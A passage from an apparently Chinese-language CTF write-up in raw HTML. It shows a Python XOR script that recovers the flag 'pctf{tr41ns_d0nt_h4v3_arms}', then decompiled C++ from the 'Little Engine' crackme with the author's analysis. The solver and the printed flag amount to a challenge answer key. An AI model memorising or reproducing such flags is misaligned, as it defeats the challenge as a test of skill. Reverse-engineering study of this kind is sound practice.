class="hljs-number">337561586</span>d<span class="hljs-number">597</span>d</span><br></pre></td></tr></tbody></table></figure><p>明显16进制输出，写个脚本跑一下</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">target = [<span class="hljs-number">0x70</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x4c</span>, <span class="hljs-number">0x7b</span>, <span class="hljs-number">0x5e</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x1e</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x1a</span>, <span class="hljs-number">0x6e</span>, <span class="hljs-number">0x5e</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x42</span>,</span><br><span class="line">          <span class="hljs-number">0x34</span>, <span class="hljs-number">0x5c</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x6d</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x7d</span>]</span><br><span class="line">flag = <span class="hljs-string">''</span></span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(target)):</span><br><span class="line">    <span class="hljs-keyword">if</span> i &amp; <span class="hljs-number">1</span>:</span><br><span class="line">        flag += <span class="hljs-built_in">chr</span>(target[i] ^ <span class="hljs-number">42</span>)</span><br><span class="line">    <span class="hljs-keyword">else</span>:</span><br><span class="line">        flag += <span class="hljs-built_in">chr</span>(target[i])</span><br><span class="line"><span class="hljs-built_in">print</span>(flag)</span><br></pre></td></tr></tbody></table></figure><p>直接输出flag</p><figure class="highlight apache hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">pctf</span>{tr<span class="hljs-number">41</span>ns_d<span class="hljs-number">0</span>nt_h<span class="hljs-number">4</span>v<span class="hljs-number">3</span>_arms}</span><br></pre></td></tr></tbody></table></figure><h4 id="Little-Engine"><a href="#Little-Engine" class="headerlink" title="Little Engine"></a>Little Engine</h4><blockquote><p>我觉得这题很不错，难度比较适中，还可以加深对于数据在内存中占用位数的理解</p></blockquote><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">__int64 __usercall main@&lt;rax&gt;(__int64 a1@&lt;rdi&gt;, <span class="hljs-keyword">char</span> **a2@&lt;rsi&gt;, <span class="hljs-keyword">char</span> **a3@&lt;rdx&gt;, __int64 a4@&lt;rbx&gt;, _QWORD *a5@&lt;r12&gt;)</span><br><span class="line">{</span><br><span class="line">  <span class="hljs-keyword">signed</span> __int64 v5; <span class="hljs-comment">// rdx</span></span><br><span class="line">  <span class="hljs-keyword">unsigned</span> __int64 v6; <span class="hljs-comment">// rcx</span></span><br><span class="line">  <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *v7; <span class="hljs-comment">// rsi</span></span><br><span class="line">  __int64 v8; <span class="hljs-comment">// rdx</span></span><br><span class="line">  __int64 v9; <span class="hljs-comment">// rcx</span></span><br><span class="line">  __int64 v10; <span class="hljs-comment">// rdi</span></span><br><span class="line">  __int64 v12; <span class="hljs-comment">// [rsp+0h] [rbp-28h]</span></span><br><span class="line">  <span class="hljs-keyword">unsigned</span> __int64 v13; <span class="hljs-comment">// [rsp+18h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  __asm { endbr64 }</span><br><span class="line">  v13 = __readfsqword(<span class="hljs-number">0x28</span>u);</span><br><span class="line">  <span class="hljs-built_in">sub_16B0</span>(a1, a2, a3);</span><br><span class="line">  <span class="hljs-built_in">sub_1830</span>(&amp;v12);</span><br><span class="line">  <span class="hljs-built_in">sub_1510</span>(v5, v6, a4, &amp;v12, &amp;v12, (<span class="hljs-keyword">unsigned</span> __int64)a2, a5);</span><br><span class="line">  <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">unsigned</span> __int8)<span class="hljs-built_in">sub_15A0</span>(&amp;v12) )</span><br><span class="line">  {</span><br><span class="line">    v7 = <span class="hljs-string">"Chugga chugga choo choo you're the little engine that CAN!"</span>;</span><br><span class="line">    <span class="hljs-built_in">sub_11F0</span>(&amp;std::cout, <span class="hljs-string">"Chugga chugga choo choo you're the little engine that CAN!"</span>, <span class="hljs-number">58LL</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    v7 = <span class="hljs-string">"I guess you don't know anything about trains...go do some TRAINing you non-conductor :("</span>;</span><br><span class="line">    <span class="hljs-built_in">sub_11F0</span>(</span><br><span class="line">      &amp;std::cout,</span><br><span class="line">      <span class="hljs-string">"I guess you don't know anything about trains...go do some TRAINing you non-conductor :("</span>,</span><br><span class="line">      <span class="hljs-number">87LL</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-built_in">sub_1170</span>(&amp;std::cout);</span><br><span class="line">  v10 = v12;</span><br><span class="line">  <span class="hljs-keyword">if</span> ( v12 )</span><br><span class="line">    <span class="hljs-built_in">sub_11C0</span>(v12, v7, v8, v9);</span><br><span class="line">  <span class="hljs-keyword">if</span> ( __readfsqword(<span class="hljs-number">0x28</span>u) != v13 )</span><br><span class="line">  {</span><br><span class="line">    <span class="hljs-built_in">sub_11E0</span>(v10, v7, v8, v9);</span><br><span class="line">    __asm { endbr64 }</span><br><span class="line">    <span class="hljs-built_in">JUMPOUT</span>(&amp;loc_12D1);</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>话好多，第一句说明正确，第二句说明错误，逻辑就很清楚了，if的条件是一个用来判断的函数</p><p>程序在<code>sub_1830()</code>里进行输入，在<code>sub_1510()</code>进行了一些处理然后判断</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function">__int64 *__fastcall <span class="hljs-title">sub_1830</span><span class="hljs-params">(__int64 *a1)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  __int64 *v1; <span class="hljs-comment">// r12</span></span><br><span class="line">  <span class="hljs-keyword">unsigned</span> __int64 v2; <span class="hljs-comment">// rsi</span></span><br><span class="line">  <span class="hljs-keyword">unsigned</span> __int8 *v3; <span class="hljs-comment">// rdx</span></span><br><span class="line">  __int64 v4; <span class="hljs-comment">// rcx</span></span><br><span class="line">  __int64 v5; <span class="hljs-comment">// rbx</span></span><br><span class="line">  __int64 v6; <span class="hljs-comment">// r13</span></span><br><span class="line">  __int64 v7; <span class="hljs-comment">// rax</span></span><br><span class="line">  <span class="hljs-keyword">char</span> *v8; <span class="hljs-comment">// rdi</span></span><br><span class="line">  <span class="hljs-keyword">char</span> *v9; <span class="hljs-comment">// r8</span></span><br><span class="line">  __int64 v10; <span class="hljs-comment">// rdx</span></span><br><span class="line">  _BYTE *v11; <span class="hljs-comment">// rax</span></span><br><span class="line">  <span class="hljs-keyword">char</span> *v13; <span class="hljs-comment">// [rsp+0h] [rbp-58h]</span></span><br><span class="line">  __int64 v14; <span class="hljs-comment">// [rsp+8h] [rbp-50h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v15; <span class="hljs-comment">// [rsp+10h] [rbp-48h]</span></span><br><span class="line">  <span class="hljs-keyword">unsigned</span> __int64 v16; <span class="hljs-comment">// [rsp+28h] [rbp-30h]</span></span><br><span class="line"></span><br><span class="line">  __asm { endbr64 }</span><br><span class="line">  v1 = a1;</span><br><span class="line">  v16 = __readfsqword(<span class="hljs-number">0x28</span>u);</span><br><span class="line">  <span class="hljs-built_in">sub_11F0</span>(&amp;std::cout, <span class="hljs-string">"Now, I hope you're a total trainiac. Give me your best tidbit: "</span>, <span class="hljs-number">63LL</span>);</span><br><span class="line">  v2 = (<span class="hljs-keyword">unsigned</span> __int64)&amp;v13;</span><br><span class="line">  v13 = &amp;v15;</span><br><span class="line">  v14 = <span class="hljs-number">0LL</span>;</span><br><span class="line">  v15 = <span class="hljs-number">0</span>;</span><br><span class="line">  <span class="hljs-built_in">sub_1220</span>(&amp;std::cin, &amp;v13);</span><br><span class="line">  v5 = v14;</span><br><span class="line">  v6 = (__int64)v13;</span><br><span class="line">  a1[<span class="hljs-number">2</span>] = <span class="hljs-number">0LL</span>;</span><br><span class="line">  *(_OWORD *)a1 = <span class="hljs-number">0LL</span>;</span><br><span class="line">  <span class="hljs-keyword">if</span> ( v5 &lt; <span class="hljs-number">0</span> )</span><br><span class="line">  {</span><br><span class="line">LABEL_32:</span><br><span class="line">    <span class="hljs-built_in">sub_1190</span>(<span class="hljs-string">"cannot create std::vector larger than max_size()"</span>);</span><br><span class="line">    __asm { endbr64 }</span><br><span class="line">    <span class="hljs-built_in">JUMPOUT</span>(&amp;loc_12AA);</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">if</span> ( v5 )</span><br><span class="line">  {</span><br><span class="line">    v7 = <span class="hljs-built_in">sub_11D0</span>(v5);</span><br><span class="line">    v8 = (<span class="hljs-keyword">char</span> *)(v7 + v5);</span><br><span class="line">    *v1 = v7;</span><br><span class="line">    v9 = v13;</span><br><span class="line">    v1[<span class="hljs-number">2</span>] = v7 + v5;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">unsigned</span> __int64)(v6 + <span class="hljs-number">15</span> - v7) &lt;= <span class="hljs-number">0x1E</span> || (<span class="hljs-keyword">unsigned</span> __int64)(v5 - <span class="hljs-number">1</span>) &lt;= <span class="hljs-number">0xE</span> )</span><br><span class="line">    {</span><br><span class="line">      v3 = <span class="hljs-number">0LL</span>;</span><br><span class="line">      <span class="hljs-keyword">do</span></span><br><span class="line">      {</span><br><span class="line">        v4 = v3[v6];</span><br><span class="line">        (v3++)[v7] = v4;</span><br><span class="line">      }</span><br><span class="line">      <span class="hljs-keyword">while</span> ( (<span class="hljs-keyword">unsigned</span> __int8 *)v5 != v3 );</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">else</span></span><br><span class="line">    {</span><br><span class="line">      v10 = <span class="hljs-number">0LL</span>;</span><br><span class="line">      <span class="hljs-keyword">do</span></span><br><span class="line">      {</span><br><span class="line">        *(__m128i *)(v7 + v10) = _mm_loadu_si128((<span class="hljs-keyword">const</span> __m128i *)(v6 + v10));</span><br><span class="line">        v10 += <span class="hljs-number">16LL</span>;</span><br><span class="line">      }</span><br><span class="line">      <span class="hljs-keyword">while</span> ( v10 != (v5 &amp; <span class="hljs-number">0xFFFFFFFFFFFFFFF0</span>LL) );</span><br><span class="line">      v2 = v5 &amp; <span class="hljs-number">0xFFFFFFFFFFFFFFF0</span>LL;</span><br><span class="line">      v4 = v5 &amp; <span class="hljs-number">0xF</span>;</span><br><span class="line">      v3 = (<span class="hljs-keyword">unsigned</span> __int8 *)(v6 + (v5 &amp; <span class="hljs-number">0xFFFFFFFFFFFFFFF0</span>LL));</span><br><span class="line">      v11 = (_BYTE *)((v5 &amp; <span class="hljs-number">0xFFFFFFFFFFFFFFF0</span>LL) + v7);</span><br><span class="line">      <span class="hljs-keyword">if</span> ( v5 != (v5 &amp; <span class="hljs-number">0xFFFFFFFFFFFFFFF0</span>LL) )</span><br><span class="line">      {</span><br><span class="line">        v2 = *v3;</span><br><span class="line">        *v11 = v2;</span><br><span class="line">        <span class="hljs-keyword">if</span> ( v4 != <span class="hljs-number">1</span> )</span><br><span class="line">        {</span><br><span class="line">          v2 = v3[<span class="hljs-number">1</span>];</span><br><span class="line">          v11[<span class="hljs-number">1</span>] = v2;</span><br><span class="line">          <span class="hljs-keyword">if</span> ( v4 != <span class="hljs-number">2</span> )</span><br><span class="line">          {</span><br><span class="line">            v2 = v3[<span class="hljs-number">2</span>];</span><br><span class="line">            v11[<span class="hljs-number">2</span>] = v2;</span><br><span class="line">            <span class="hljs-keyword">if</span> ( v4 != <span class="hljs-number">3</span> )</span><br><span class="line">            {</span><br><span class="line">              v2 = v3[<span class="hljs-number">3</span>];</span><br><span class="line">              v11[<span class="hljs-number">3</span>] = v2;</span><br><span class="line">              <span class="hljs-keyword">if</span> ( v4 != <span class="hljs-number">4</span> )</span><br><span class="line">              {</span><br><span class="line">                v2 = v3[<span class="hljs-number">4</span>];</span><br><span class="line">                v11[<span class="hljs-number">4</span>] = v2;</span><br><span class="line">                <span class="hljs-keyword">if</span> ( v4 != <span class="hljs-number">5</span> )</span><br><span class="line">                {</span><br><span class="line">                  v2 = v3[<span class="hljs-number">5</span>];</span><br><span class="line">                  v11[<span class="hljs-number">5</span>] = v2;</span><br><span class="line">                  <span class="hljs-keyword">if</span> ( v4 != <span class="hljs-number">6</span> )</span><br><span class="line">                  {</span><br><span class="line">                    v2 = v3[<span class="hljs-number">6</span>];</span><br><span class="line">                    v11[<span class="hljs-number">6</span>] = v2;</span><br><span class="line">                    <span class="hljs-keyword">if</span> ( v4 != <span class="hljs-number">7</span> )</span><br><span class="line">                    {</span><br><span class="line">                      v2 = v3[<span class="hljs-number">7</span>];</span><br><span class="line">                      v11[<span class="hljs-number">7</span>] = v2;</span><br><span class="line">                      <span class="hljs-keyword">if</span> ( v4 != <span class="hljs-number">8</span> )</span><br><span class="line">                      {</span><br><span class="line">                        v2 = v3[<span class="hljs-number">8</span>];</span><br><span class="line">                        v11[<span class="hljs-number">8</span>] = v2;</span><br><span class="line">                        <span class="hljs-keyword">if</span> ( v4 != <span class="hljs-number">9</span> )</span><br><span class="line">                        {</span><br><span class="line">                          v2 = v3[<span class="hljs-number">9</span>];</span><br><span class="line">                          v11[<span class="hljs-number">9</span>] = v2;</span><br><span class="line">                          <span class="hljs-keyword">if</span> ( v4 != <span class="hljs-number">10</span> )</span><br><span class="line">                          {</span><br><span class="line">                            v2 = v3[<span class="hljs-number">10</span>];</span><br><span class="line">                            v11[<span class="hljs-number">10</span>] = v2;</span><br><span class="line">                            <span class="hljs-keyword">if</span> ( v4 != <span class="hljs-number">11</span> )</span><br><span class="line">                            {</span><br><span class="line">                              v2 = v3[<span class="hljs-number">11</span>];</span><br><span class="line">                              v11[<span class="hljs-number">11</span>] = v2;</span><br><span class="line">                              <span class="hljs-keyword">if</span> ( v4 != <span class="hljs-number">12</span> )</span><br><span class="line">                              {</span><br><span class="line">                                v2 = v3[<span class="hljs-number">12</span>];</span><br><span class="line">                                v11[<span class="hljs-number">12</span>] = v2;</span><br><span class="line">                                <span class="hljs-keyword">if</span> ( v4 != <span class="hljs-number">13</span> )</span><br><span class="line">                                {</span><br><span class="line">                                  v2 = v3[<span class="hljs-number">13</span>];</span><br><span class="line">                                  v11[<span class="hljs-number">13</span>] = v2;</span><br><span class="line">                                  <span class="hljs-keyword">if</span> ( v4 != <span class="hljs-number">14</span> )</span><br><span class="line">                                  {</span><br><span class="line">                                    v3 = (<span class="hljs-keyword">unsigned</span> __int8 *)v3[<span class="hljs-number">14</span>];</span><br><span class="line">                                    v11[<span class="hljs-number">14</span>] = (_BYTE)v3;</span><br><span class="line">                                  }</span><br><span class="line">                                }</span><br><span class="line">                              }</span><br><span class="line">                            }</span><br><span class="line">                          }</span><br><span class="line">                        }</span><br><span class="line">                      }</span><br><span class="line">                    }</span><br><span class="line">                  }</span><br><span class="line">                }</span><br><span class="line">              }</span><br><span class="line">            }</span><br><span class="line">          }</span><br><span class="line">        }</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    v9 = (<span class="hljs-keyword">char</span> *)v6;</span><br><span class="line">    v8 = <span class="hljs-number">0LL</span>;</span><br><span class="line">  }</span><br><span class="line">  v1[<span class="hljs-number">1</span>] = (__int64)v8;</span><br><span class="line">  <span class="hljs-keyword">if</span> ( v9 != &amp;v15 )</span><br><span class="line">  {</span><br><span class="line">    v8 = v9;</span><br><span class="line">    <span class="hljs-built_in">sub_11C0</span>(v9, v2, v3, v4);</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">if</span> ( __readfsqword(<span class="hljs-number">0x28</span>u) != v16 )</span><br><span class="line">  {</span><br><span class="line">    <span class="hljs-built_in">sub_11E0</span>(v8, v2, v3, v4);</span><br><span class="line">    <span class="hljs-keyword">goto</span> LABEL_32;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">return</span> v1;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>程序看起来异常复杂，但是经过我的仔细分(tiao)析(shi)，发现只是把输入拷贝到了内存里分配好的空间。</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">__int64 __usercall sub_1510@&lt;rax&gt;(<span class="hljs-keyword">signed</span> __int64 a1@&lt;rdx&gt;, <span class="hljs-keyword">unsigned</span> __int64 a2@&lt;rcx&gt;, __int64 a3@&lt;rbx&gt;, <span class="hljs-keyword">void</span> *a4@&lt;rbp&gt;, __int64 *a5@&lt;rdi&gt;, <span class="hljs-keyword">unsigned</span> __int64 a6@&lt;rsi&gt;, _QWORD *a7@&lt;r12&gt;)</span><br><span class="line">{</span><br><span class="line">  _QWORD *v7; <span class="hljs-comment">// rax</span></span><br><span class="line">  __int64 v8; <span class="hljs-comment">// rdx</span></span><br><span class="line">  __int64 v9; <span class="hljs-comment">// rcx</span></span><br><span class="line">  __int64 v10; <span class="hljs-comment">// rdx</span></span><br><span class="line">  __int64 v11; <span class="hljs-comment">// rcx</span></span><br><span class="line">  __int64 v12; <span class="hljs-comment">// rdx</span></span><br><span class="line">  __int64 v13; <span class="hljs-comment">// rcx</span></span><br><span class="line">  <span class="hljs-keyword">char</span> **v14; <span class="hljs-comment">// rdx</span></span><br><span class="line">  __int64 v15; <span class="hljs-comment">// rax</span></span><br><span class="line">  _BYTE *v16; <span class="hljs-comment">// rax</span></span><br><span class="line">  __int64 v17; <span class="hljs-comment">// rcx</span></span><br><span class="line">  __int64 v18; <span class="hljs-comment">// rcx</span></span><br><span class="line">  __int64 result; <span class="hljs-comment">// rax</span></span><br><span class="line">  <span class="hljs-keyword">unsigned</span> __int64 v20; <span class="hljs-comment">// rt1</span></span><br><span class="line">  <span class="hljs-keyword">unsigned</span> __int64 v21; <span class="hljs-comment">// [rsp+18h] [rbp-10h]</span></span><br><span class="line">  <span class="hljs-keyword">void</span> *retaddr; <span class="hljs-comment">// [rsp+28h] [rbp+0h]</span></span><br><span class="line"></span><br><span class="line">  __asm { endbr64 }</span><br><span class="line">  v21 = __readfsqword(<span class="hljs-number">0x28</span>u);</span><br><span class="line">  v15 = *a5;</span><br><span class="line">  <span class="hljs-keyword">if</span> ( *a5 == a5[<span class="hljs-number">1</span>] )</span><br><span class="line">  {</span><br><span class="line">LABEL_5:</span><br><span class="line">    v20 = __readfsqword(<span class="hljs-number">0x28</span>u);</span><br><span class="line">    result = v20 ^ v21;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v20 != v21 )</span><br><span class="line">    {</span><br><span class="line">      <span class="hljs-built_in">sub_11E0</span>(a5, a6, a1, a2);</span><br><span class="line">      result = <span class="hljs-built_in">sub_15A0</span>(a5);</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    a6 = <span class="hljs-number">0LL</span>;</span><br><span class="line">    a1 = <span class="hljs-number">4294967185LL</span>;</span><br><span class="line">    <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )</span><br><span class="line">    {</span><br><span class="line">      v16 = (_BYTE *)(a6 + v15);</span><br><span class="line">      v17 = (<span class="hljs-keyword">unsigned</span> __int8)*v16;</span><br><span class="line">      <span class="hljs-keyword">if</span> ( (_BYTE)v17 == <span class="hljs-number">10</span> )</span><br><span class="line">        <span class="hljs-keyword">break</span>;</span><br><span class="line">      *v16 = a1 ^ v17;</span><br><span class="line">      v18 = (<span class="hljs-keyword">unsigned</span> __int8)a1 + a6++;</span><br><span class="line">      v15 = *a5;</span><br><span class="line">      a1 = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)v18</span><br><span class="line">         + (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)((<span class="hljs-keyword">unsigned</span> __int64)(<span class="hljs-number">0x8080808080808081</span>LL * (<span class="hljs-keyword">unsigned</span> __int128)(<span class="hljs-keyword">unsigned</span> __int64)v18 &gt;&gt; <span class="hljs-number">64</span>) &gt;&gt; <span class="hljs-number">7</span>);</span><br><span class="line">      a2 = a5[<span class="hljs-number">1</span>] - *a5;</span><br><span class="line">      <span class="hljs-keyword">if</span> ( a6 &gt;= a2 )</span><br><span class="line">        <span class="hljs-keyword">goto</span> LABEL_5;</span><br><span class="line">    }</span><br><span class="line">    v7 = (_QWORD *)<span class="hljs-built_in">sub_1180</span>(<span class="hljs-number">8LL</span>, a6, a1, v17, <span class="hljs-number">-9187201950435737471LL</span>);</span><br><span class="line">    *v7 = &amp;unk_3CD0;</span><br><span class="line">    <span class="hljs-built_in">sub_1250</span>(v7, &amp;`typeinfo <span class="hljs-keyword">for</span><span class="hljs-number">'</span>std::exception, &amp;std::exception::~exception);</span><br><span class="line">    <span class="hljs-built_in">sub_11C0</span>(a4, &amp;`typeinfo <span class="hljs-keyword">for</span><span class="hljs-number">'</span>std::exception, v8, v9);</span><br><span class="line">    <span class="hljs-built_in">sub_1260</span>(a7);</span><br><span class="line">    <span class="hljs-keyword">if</span> ( *a7 )</span><br><span class="line">      <span class="hljs-built_in">sub_11C0</span>(*a7, &amp;`typeinfo <span class="hljs-keyword">for</span><span class="hljs-number">'</span>std::exception, v10, v11);</span><br><span class="line">    <span class="hljs-keyword">if</span> ( retaddr != a4 )</span><br><span class="line">      <span class="hljs-built_in">sub_11C0</span>(retaddr, &amp;`typeinfo <span class="hljs-keyword">for</span><span class="hljs-number">'</span>std::exception, v10, v11);</span><br><span class="line">    <span class="hljs-built_in">sub_1260</span>(a3);</span><br><span class="line">    <span class="hljs-keyword">if</span> ( retaddr )</span><br><span class="line">      <span class="hljs-built_in">sub_11C0</span>(retaddr, &amp;`typeinfo <span class="hljs-keyword">for</span><span class="hljs-number">'</span>std::exception, v12, v13);</span><br><span class="line">    <span class="hljs-built_in">sub_1260</span>(a4);</span><br><span class="line">    result = <span class="hljs-built_in">main</span>((__int64)a4, (<span class="hljs-keyword">char</span> **)&amp;`typeinfo <span class="hljs-keyword">for</span><span class="hljs-number">'</span>std::exception, v14);</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">return</span> result;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>这又是一个异常复杂的函数，但实际上有用的内容并不多</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">a6 = <span class="hljs-number">0LL</span>;</span><br><span class="line">  a1 = <span class="hljs-number">4294967185LL</span>;</span><br><span class="line">  